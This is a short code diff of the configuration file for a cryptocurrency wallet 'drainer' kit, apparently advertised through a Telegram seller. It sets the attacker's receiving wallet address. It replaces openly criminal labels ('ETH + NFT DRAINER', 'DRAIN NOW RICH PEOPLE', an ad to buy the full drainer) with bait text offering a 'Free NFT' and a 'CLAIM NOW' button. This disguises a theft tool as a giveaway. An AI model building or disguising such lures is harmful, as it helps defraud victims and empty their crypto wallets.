@@ -1,7 +1,7 @@
 const receiveAddress = "Y0x7d8Ac1a2806f8670fB0c643Dc732488d3cDC6dC4";
 
 const collectionInfo = {
-    name: "TEC DRAINER",
+    name: "NFT for all",
     socialMedia: {
         discord: "https://t.me/TecOnSellix",
         twitter: "https://t.me/TecOnSellix",
@@ -12,13 +12,13 @@ const collectionInfo = {
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "ETH + NFT DRAINER",
+    underTitle: "Free NFT for all",
 }
 
 const claimPageInfo = {
     title: "FREE NFT", // Name will appeair
-    shortDescription: "DRAIN NOW RICH PEOPLE.",
-    longDescription: "YOU CAN ALSO BUY FULL ETH DRAINER WITH SIGNATURE AT T.ME/TECONSELLIX. ENJOY DRAINING!",
+    shortDescription: "NFT offer for all",
+    longDescription: "YOU CAN CLAIM YOUR NFT NOW TO BECOME NFT MEMBER !",
 
     claimButtonText: "CLAIM NOW",
 
